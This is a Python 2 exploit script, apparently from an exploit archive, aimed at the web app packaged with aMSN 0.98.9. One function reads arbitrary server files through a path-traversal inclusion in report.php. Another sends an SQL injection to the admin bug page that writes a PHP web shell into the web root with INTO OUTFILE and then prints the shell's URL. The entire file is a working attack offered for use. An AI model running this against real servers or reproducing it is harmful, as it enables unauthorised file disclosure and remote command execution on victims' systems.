import urllib2
import string
import random
 
"""
    Preauth LFI and SQLi in the web app packaged with aMSN 0.98.9
"""
 
def lfi(options):
    """ exploit the LFI
    """
    addr = &#039;http://{0}{1}/bugs/report.php?lang=../../../../../{2}&#039;.format(\
                            options.ip, options.root, options.lfi)
    data = urllib2.urlopen(addr).read().rstrip().split("ERROR")[0]
    print data
 
def run(options):
    """ exploit lfi or sqli
    """
    if options.lfi:
        return lfi(options)
 
    shell = &#039;&#039;.join(random.choice(string.ascii_lowercase + string.digits) for x in range(5))
    sqli = &#039;http://{0}{1}/bugs/admin/index.php?show=bug&id=&#039;.format(options.ip, options.root)
 
    # &#039; UNION SELECT &#039;<?php system($_GET[&#039;cmd&#039;]) ?>,2,3,4,5,6,7,8,9 INTO OUTFILE &#039;yourshell&#039;;-- -
    exploit = &#039;1\&#039;%20UNION%20SELECT%20\&#039;<?php%20system($_GET[\\\&#039;cmd\\\&#039;])?>\&#039;,2,3,4,5,6,7,8,9%20&#039;\
              &#039;INTO%20OUTFILE%20\&#039;{0}/{1}.php\&#039;;%20--%20-%20&#039;.format(options.path,shell)
 
    urllib2.urlopen(sqli + exploit)
    print &#039;[!] Shell dropped.  http://%s%s/%s.php?cmd=ls&#039; % (options.ip, options.root, shell)
 
def parse_args():
    parser = ArgumentParser()
    parser.add_argument("-i", help=&#039;Server address&#039;, action=&#039;store&#039;, dest=&#039;ip&#039;, required=True)
    parser.add_argument(&#039;-l&#039;, help=&#039;Local file inclusion&#039;, action=&#039;store&#039;, dest=&#039;lfi&#039;,
                              metavar=&#039;[file]&#039;)
    parser.add_argument(&#039;-p&#039;, help=&#039;Path to amsn [/amsn]&#039;, action=&#039;store&#039;, dest=&#039;root&#039;,
                              default=&#039;/amsn&#039;)
    parser.add_argument(&#039;-w&#039;, help=&#039;Path to drop shell [/var/www/amsn&#039;, dest=&#039;path&#039;,
                              default=&#039;/var/www/amsn&#039;)
 
    options = parser.parse_args()
    options.path = options.path if options.path[-1] != &#039;/&#039; else options.path[:-1]
    options.root = options.root if options.root[-1] != &#039;/&#039; else options.root[:-1]
    return options
 
if __name__ == "__main__":
    run(parse_args())

